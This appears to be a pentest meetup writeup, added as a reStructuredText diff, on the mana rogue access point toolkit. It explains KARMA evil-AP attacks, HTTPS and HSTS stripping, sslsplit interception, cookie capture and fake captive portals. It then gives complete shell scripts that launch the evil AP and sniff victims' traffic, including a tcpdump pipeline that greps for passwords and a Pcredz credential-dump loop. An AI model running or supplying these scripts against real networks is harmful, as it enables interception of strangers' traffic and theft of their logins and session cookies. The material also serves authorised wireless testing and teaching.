@@ -1,0 +1,427 @@
+.. include:: /pentest_links.txt
+
+
+************
+`mana`_
+************
+
+This writeup assumes you understand `HSTS`_. See :ref:`HSTS_Tutorial` if not.
+
+evilAP
+======
+
+what is mana?
+-------------
+
+From `mana`_:
+
+  A toolkit for rogue access point (evilAP) attacks first presented at Defcon 22.
+
+  More specifically, it contains the improvements to KARMA attacks we implemented into hostapd, as well as some useful configs for conducting MitM once you've managed to get a victim to connect.
+
+  The different start scripts are listed below and must be edited to point to the right wifi device (default is wlan0, this may not be right for your installation):
+
+  * ``start-nat-full.sh`` - Will fire up MANA in NAT mode (you'll need an upstream link) with all the MitM bells and whistles.
+  * ``start-nat-simple.sh`` - Will fire up MANA in NAT mode, but without any of the firelamb, sslstrip, sslsplit etc.
+  * ``start-noupstream.sh`` - Will start MANA in a "fake Internet" mode. Useful for places where people leave their wifi on, but there is no upstream Internet. Also contains the captive portal.
+  * ``start-noupstream-eap.sh`` - Will start MANA with the EAP attack and noupstream mode.
+
+Here is the actual Defcon22 presentation: `Manna from Heaven; Improving the state of wireless rogue AP attacks - Dominic White & Ian de Villiers <http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/08-manna-from-heaven-improving-the-state-of-wireless-rogue-ap-attacks-dominic-white-ian-de-villiers>`_. It's one of the many `Defcon Wireless Village 2014 (Defcon 22) Videos <http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/mainlist>`_.
+
+`mana`_ pieces
+--------------
+
+apache2 - web server used for noupstream run (area without wifi connection)
+  Used by `mana`_ to provide fake web sites to trick users into giving authentication credentials.
+
+crackapd - EAP cred cracker for noupstream-EAP run (area without wifi connection)
+  `mana`_ tool for offloading the cracking of EAP creds to an external tool (using a word list) and re-adding them to the hostapd EAP config (auto crack 'n add).
+
+dhcpd - dhcp server for all run types
+  See `dhcpd man page <http://linux.die.net/man/8/dhcpd>`_.
+
+dns2proxy - dns query victimization used by sslstrip-hsts
+  Modified version of `dns2proxy <https://github.com/LeonardoNve/dns2proxy>`_. sslstrip-hsts will mangle the hostnames to avoid `HSTS`_ and dns2proxy will detect and correct those changes. For example, can strip out a prepended "wwww." or "web" from a DNS request.
+
+  See `OFFENSIVE: Exploiting DNS servers changes BlackHat Asia 2014 <http://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014>`_ and `Demo Offensive DNS server <https://www.youtube.com/watch?v=cJtbxX1HS5I>`_.
+
+dnsspoof -  forge replies to DNS address / pointer queries
+  See `dnsspoof man page <http://linux.die.net/man/8/dnsspoof>`_.
+
+firelamb - cookie capture
+  `mana`_ program to parse pcap files or listen on interface for cookies, then start firefox with cookies added to profile.
+
+hostapd-mana - IEEE 802.11 AP and IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator
+  `mana`_-modified `hostapd <http://wireless.kernel.org/en/users/Documentation/hostapd>`_ for new `karma <http://www.theta44.org/karma/index.html>`_ attacks.
+
+macchanger - change mac address
+  See `macchanger <https://github.com/alobbs/macchanger>`_.
+
+msfconsole - metasploit console used in the noupstream runs
+  See `msf console <http://www.offensive-security.com/metasploit-unleashed/Msfconsole>`_.
+
+sslsplit - generic transparent TLS/SSL proxy for MitM attacks
+  From `SSLsplit`_:
+
+    SSLsplit is a tool for man-in-the-middle attacks against SSL/TLS encrypted network connections. Connections are transparently intercepted through a network address translation engine and redirected to SSLsplit. SSLsplit terminates SSL/TLS and initiates a new SSL/TLS connection to the original destination address, while logging all data transmitted. 
+
+sslstrip-hsts - change HTTPS to HTTP
+  Tries to get clients to connect via http instead of https. `mana`_ uses a modified version of sslsplit to avoid `HSTS`_.
+
+stunnel4 - SSL encryption wrapper between remote clients and local or remote servers
+  See `stunnel4 <http://man.he.net/man8/stunnel4>`_. Non-SSL aware daemons can communicate with clients over secure SSL channels.
+
+tinyproxy - light-weight HTTP/HTTPS proxy daemon
+  See `tinyproxy <https://banu.com/tinyproxy/>`_.
+
+
+run-mana scripts
+----------------
+
+Of these start scripts, the one of most interest for the meetup is ``start-nat-full.sh``. Here is a summary of the 4 start scripts:
+
+===============   ========    ==========    ==========    ===============
+SETUP             nat-full    nat-simple    noupstream    noupstream-eap
+===============   ========    ==========    ==========    ===============
+upstream i/f        eth0        wlan0         N/A           N/A
+evilAP i/f          wlan0       wlan1         wlan0         wlan0/wlan0_0
+network-manager     stop        stop          stop          stop
+dhcpd               Y           Y             Y             Y
+nat                 Y           Y             N             N
+firelamb            Y           N             N             N
+sslsplit            Y           N             N             N
+dns2proxy           Y           N             N             N
+sslstrip            Y           N             N             N
+macchanger          Y           N             Y             N
+apache2             N           N             Y             Y
+dnsspoof            N           N             Y             Y
+msfconsole          N           N             Y             Y
+stunnel4            N           N             Y             Y
+tinyproxy           N           N             Y             Y
+crackapd            N           N             N             Y
+===============   ========    ==========    ==========    ===============
+
+
+why run `mana`_?
+----------------
+
+
+create SSIDs based on client probe requests
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+As clients probe for their perviously-connected SSIDs, `mana`_ can advertise that added SSID exclusively to the client making the probe. Devices may then automatically connect to evilAP.
+
+
+circumvent https
+^^^^^^^^^^^^^^^^
+
+Here we show a client requesting `http://www.google.com/ <http://www.google.com/>`_ and instead of getting redirected to `https://www.google.com/?gws_rd=ssl <https://www.google.com/?gws_rd=ssl>`_ they get redirected to `http://wwww.google.com/?gws_rd=ssl <http://wwww.google.com/?gws_rd=ssl>`_. Note the lack of https and the 4 w's vs. the correct 3.
+
+.. code-block:: bash
+
+  hacker@kali:~$ curl -v --location --user-agent "Firefox/31.0" \
+      http://www.google.com/ 2>&1 | \
+  egrep '(> User-Agent:|< HTTP/1|< Location:|< Strict-Transport-Security:)'
+  > User-Agent: Firefox/31.0
+  < HTTP/1.1 302 Found
+  < Location: http://wwww.google.com/?gws_rd=ssl
+  > User-Agent: Firefox/31.0
+  < HTTP/1.1 200 OK
+
+
+circumvent `HSTS`_
+^^^^^^^^^^^^^^^^^^^
+
+Here we show a client requesting `http://mail.yahoo.com/ <http://mail.yahoo.com/>`_ and instead of getting redirected to `https://mail.yahoo.com/?.src-ym&.intl=us&lang-en-US&.done=https%3a//mail.yahoo.com <https://mail.yahoo.com/?.src-ym&.intl=us&lang-en-US&.done=https%3a//mail.yahoo.com>`_ they get redirected to `http://weblogin.yahoo.com/?.src-ym&.intl=us&lang-en-US&.done=https%3a//mail.yahoo.com <http://weblogin.yahoo.com/?.src-ym&.intl=us&lang-en-US&.done=https%3a//mail.yahoo.com>`_. Note the lack of https and login is replaced by weblogin. Unfortunately this one didn't work as the resulting web page had no content! `mana`_ is new so this failure is not surprising.
+
+
+.. code-block:: bash
+
+  hacker@kali:~$ curl -v --location --user-agent "Firefox/31.0" \
+      http://mail.yahoo.com/ 2>&1 | \
+  egrep '(> User-Agent:|< HTTP/1|< Location:|< Strict-Transport-Security:)'
+  > User-Agent: Firefox/31.0
+  < HTTP/1.1 302 Found
+  < Location: /m
+  > User-Agent: Firefox/31.0
+  < HTTP/1.1 302 Found
+  < Location: http://webmail.yahoo.com/m
+  > User-Agent: Firefox/31.0
+  < HTTP/1.1 200 OK
+
+
+
+MitM HTTPS via sslsplit
+^^^^^^^^^^^^^^^^^^^^^^^
+
+When the client forces https, `mana`_ dynamically generates (untrusted) certificates for the remote site. If the user accepts the certificate then all traffic is decrypted.
+
+
+capture cookies via firelamb
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Once traffic is unencrypted, firelamb is used to capture cookies for use in the local firefox.
+
+
+captive portal
+^^^^^^^^^^^^^^
+
+Even when no Internet is available, evilAP can fake web sites to try and harvest user credentials.
+
+
+
+kali prep
+=========
+
+`mana`_ installation
+--------------------
+
+`mana`_ install is as simple as ``apt-get install mana-toolkit``. `mana`_'s installation and use is in the spirit of Kali Linux: root permissions are needed to run much of the tool and it takes over the network interfaces, so it's not designed to be a shared app run simulataneously by non-root users. So at runtime it modifies config files and writes to system directories. If at any time you feel you may have hopelessly messed up your configuration files you can simply ``apt-get purge mana-toolkit -y; apt-get install mana-toolkit -y`` and you're back to the original configuration.
+
+
+
+Optionally see :ref:`PcredzPcapCreds` for  `Pcredz`_ installation should you wish to analyze pcap files for credentials.
+
+
+mana and the default Kali network setup
+---------------------------------------
+
+At the meetup we had two classes of pentesters: those running Windows with a Kali VM vs. those running native Kali Linux. The Windows VM users met with unqualified success, but those running native Kali met with failure. The reason is quite simple.
+
+The Windows Kali VM network configuration is a "wired" eth0 bridged to the Windows host's wifi connection, and a wireless wlan0 (a pass-thru to the Windows host's second wireless adapter). The default */usr/share/mana-toolkit/run-mana/start-nat-full.sh* uses eth0 as the upstream link, wlan0 for the evilAP, and kills the ``network-manager`` process in order to take over wlan0. This works fine with the default Kali network configuration: eth0 is managed by ``networking`` which was not killed, and `mana`_ takes over wlan0. So it works.
+
+But consider the native Kali networking: the meetup is a wireless-only network, so the wired eth0 is not used leaving ``network-manager``-controlled wlan0 to connect to the Internet (and leaving wlan1 free for evilAP). But ``/usr/share/mana-toolkit/run-mana/start-nat-full.sh`` defaults to eth0 as the upstream, kills ``network-manager`` taking down wlan0's Internet connection, and takes over wlan0 for evilAP. That leaves eth0 down, wlan0 supporting evilAP, and wlan1 down (because ``network-manager`` is down). So there's no Internet connection. And the solution is not as simple as changing the configuration file to use wlan0 for the upstream and wlan1 for evilAP: when ``network-manager`` goes down, so does wlan0 and the Internet.
+
+For a review of the default Kali Linux network setup see :ref:`KaliDefaultNetworking`. Since Kali defaults to ``networking`` controling eth0 and ``network-manager`` controling wlan0 & wlan1, we need to move wlan0 contol to ``networking``. Then, when ``network-manager`` is stopped the Internet connection is still available on ``wlan0`` since ``networking`` is still running. Follow :ref:`MoveWireless2Networking` to accomplish this.
+
+
+Running ``start-nat-full.sh``
+=============================
+
+
+Configure a disposable `mana`_ run environment
+----------------------------------------------
+
+We assume you've followed :ref:`MoveWireless2Networking` . So ``networking`` controls wlan0 as the Internet connection.
+
+We create the following directory structure:
+
+  | ~/mana/run-mana = modified `mana`_ run scripts and config files
+  |
+  | ~/mana/run-mana/logs = some `mana`_ log files
+  | ~/mana/run-mana/sslsplit = `SSLsplit`_ log files
+  |
+  | ~/mana/mana-start = scripts for `mana`_ +
+  |     `urlsnarf`_, `driftnet`_, `tcpdump`_, and `Pcredz`_.
+  |
+  | ~/mana/mana-start/mana-pics = `driftnet`_ temp file storage
+
+The script ``~/mana/run-all.sh`` will start a new terminal windows running the ``~/mana/mana-start/*.sh`` scripts; these run ``start-nat-full.sh``, `urlsnarf`_, `driftnet`_, `tcpdump`_, and `Pcredz`_. To stop the run, select the *mana 01* tab and hit enter, then close the terminal.
+
+To create the directories:
+
+.. code-block:: bash
+
+  cd
+  mkdir -p mana/mana-start/mana-pics
+  mkdir -p mana/run-mana/{logs,sslsplit}
+
+Then to create ``run-all.sh``:
+
+.. code-block:: bash
+
+  # create run-all.sh
+  cd ~/mana
+  cat <<EOF > run-all.sh
+  #!/usr/bin/env bash
+
+  SUDO=\$(which sudo)
+  [[ "\$USER" == "root" ]] && SUDO=
+  DIR="\$( cd "\$( dirname "\${BASH_SOURCE[0]}" )" && pwd )"
+  cd \$DIR/mana-start
+
+  # enable X windows by root
+  xhost local:root
+
+  \$SUDO echo here we go
+  \$SUDO gnome-terminal  \\
+  --tab -t "mana 01" -e "bash -c './01_*.sh; read; exec /bin/bash'"  \\
+  --tab -t "mana 02" -e "bash -c 'sleep 4; ./02_*.sh; read; exec /bin/bash'"  \\
+  --tab -t "mana 03" -e "bash -c 'sleep 5; ./03_*.sh; read; exec /bin/bash'"  \\
+  --tab -t "mana 04" -e "bash -c 'sleep 6; ./04_*.sh; read; exec /bin/bash'"  \\
+  --tab -t "mana 05" -e "bash -c 'sleep 7; ./05_*.sh; read; exec /bin/bash'"
+  EOF
+  
+  chmod +x run-all.sh
+
+
+.. code-block:: bash
+
+  # create 01_mana-start.sh
+  cd ~/mana/mana-start
+  cat <<EOF > 01_mana-start.sh
+  #!/bin/bash
+
+  SUDO=\$(which sudo)
+  [[ "\$USER" == "root" ]] && SUDO=
+  DIR="\$( cd "\$( dirname "\${BASH_SOURCE[0]}" )" && pwd )"
+  RUNDIR=\$DIR/../run-mana
+
+  echo
+  cd \$RUNDIR
+  ROUTING="\$(cat /proc/sys/net/ipv4/ip_forward)"
+  HN="\$(hostname)"
+  \$SUDO \$RUNDIR/start-nat-full.sh
+  echo "\$ROUTING" > /proc/sys/net/ipv4/ip_forward
+  hostname \$HN
+  EOF
+  
+  chmod +x 01_mana-start.sh
+
+.. code-block:: bash
+
+  # create 02_mana-urlsnarf.sh
+  cd ~/mana/mana-start
+  cat <<EOF > 02_mana-urlsnarf.sh
+  #/bin/bash
+
+  SUDO=\$(which sudo)
+  [[ "\$USER" == "root" ]] && SUDO=
+  DIR="\$( cd "\$( dirname "\${BASH_SOURCE[0]}" )" && pwd )"
+  PHY=wlan1
+
+  echo
+  cd \$DIR
+  \$SUDO urlsnarf -i \$PHY
+  echo
+  EOF
+  
+  chmod +x 02_mana-urlsnarf.sh
+
+.. code-block:: bash
+
+  # create 03_mana-driftnet.sh
+  cd ~/mana/mana-start
+  cat <<EOF > 03_mana-driftnet.sh
+  #/bin/bash
+
+  SUDO=\$(which sudo)
+  [[ "\$USER" == "root" ]] && SUDO=
+  DIR="\$( cd "\$( dirname "\${BASH_SOURCE[0]}" )" && pwd )"
+  PHY=wlan1
+
+  echo
+  cd \$DIR
+  # \$SUDO echo 1 > /proc/sys/net/ipv4/ip_forward
+  \$SUDO driftnet -i \$PHY -d \$DIR/mana-pics
+  echo
+  EOF
+  
+  chmod +x 03_mana-driftnet.sh
+
+.. code-block:: bash
+
+  # create 04_mana-pw-snarf.sh
+  cd ~/mana/mana-start
+  cat <<EOF > 04_mana-pw-snarf.sh
+  #/bin/bash
+
+  SUDO=\$(which sudo)
+  [[ "\$USER" == "root" ]] && SUDO=
+  DIR="\$( cd "\$( dirname "\${BASH_SOURCE[0]}" )" && pwd )"
+  PHY=wlan1
+
+  echo
+  cd \$DIR
+  \$SUDO tcpdump -i \$PHY -vv -s 0 -C 500 -W 10 -w \$DIR/mana-pcap.pcap \\
+    port http or port ftp or port smtp or port imap or port pop3 -l -A \\
+    | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=\\
+  |passwd=|password=|pass:user:|username:|password:|login:|pass |user ' \\
+    --color=auto --line-buffered -B20
+  echo
+  EOF
+  
+  chmod +x 04_mana-pw-snarf.sh
+
+.. code-block:: bash
+
+  # create 05_mana-Pcredz.sh
+  cd ~/mana/mana-start
+  cat <<EOF > 05_mana-Pcredz.sh
+  #/bin/bash
+
+  SUDO=\$(which sudo)
+  [[ "\$USER" == "root" ]] && SUDO=
+  DIR="\$( cd "\$( dirname "\${BASH_SOURCE[0]}" )" && pwd )"
+  PCAP=mana-pcap.pcap0
+  CREDS=CredentialDump-Session.log
+
+  echo
+  cd "\$DIR"
+  while true; do
+    read -p "Do you wish to run Pcredz on \$PCAP?" yn
+    case \$yn in
+      [Yy]* ) \$DIR/Pcredz -f \$PCAP; less \$CREDS; continue;;
+      [Nn]* ) break;;
+      * ) break;;
+    esac
+  done
+  echo
+  EOF
+  
+  chmod +x 05_mana-Pcredz.sh
+
+  # fetch Pcredz
+  cd ~/mana/start-mana
+  curl -O https://github.com/lgandx/PCredz/blob/master/Pcredz
+  chmod +x Pcredz
+
+
+Next we get modified versions of the `mana`_ scripts and configuration files:
+
+.. code-block:: bash
+
+  # modify start-nat-full.sh
+  DIR=$HOME/mana/run-mana
+  LOGDIR=$DIR/logs
+  SSLSPLITDIR=$DIR/sslsplit
+  cd $DIR
+  SCRIPT=start-nat-full.sh
+  cp /usr/share/mana-toolkit/run-mana/$SCRIPT .
+  sed -i "s/^upstream=.*$/upstream=wlan0/" $SCRIPT
+  sed -i "s/^phy=.*$/phy=wlan1/" $SCRIPT
+  sed -i "s/^conf=.*$/conf=hostapd-karma.conf/" $SCRIPT
+  sed -i "s#/var/lib/mana-toolkit/sslstrip.log#"$LOGDIR"/sslstrip.log#" $SCRIPT
+  sed -i "s#/var/lib/mana-toolkit/sslsplit #"$SSLSPLITDIR" #" $SCRIPT
+  sed -i "s#/var/lib/mana-toolkit/sslsplit-connect.log#\
+  "$SSLSPLITDIR"/sslsplit-connect.log#" $SCRIPT
+
+  # modify hostapd-karma.conf
+  CONF=hostapd-karma.conf
+  cp /etc/mana-toolkit/$CONF .
+  sed -i "s/^enable_karma=.*$/enable_karma=1/" $CONF
+  sed -i "s/^karma_loud=.*$/karma_loud=0/" $CONF
+
+And we're all set to go.
+
+
+Additional software run with ``start-nat-full.sh``
+--------------------------------------------------
+
+`urlsnarf`_ extracts HTTP traffic from a live network interface or a pcap file.
+
+`driftnet`_ picks out images from TCP streams from a live network interface or a pcap file. Files get deleted when terminated.
+
+`Pcredz`_ to find cracked passwords.
+  
+
+Run ``start-nat-full.sh``
+-------------------------
+
+Now we can start the `mana`_ demo by simply running ``./run-all.sh``.
+
+
+Undo changes - getting back to normal Kali networking
+-----------------------------------------------------
+
+When done with the `mana`_ demo, follow the cleanup part of :ref:`MoveWireless2Networking`.
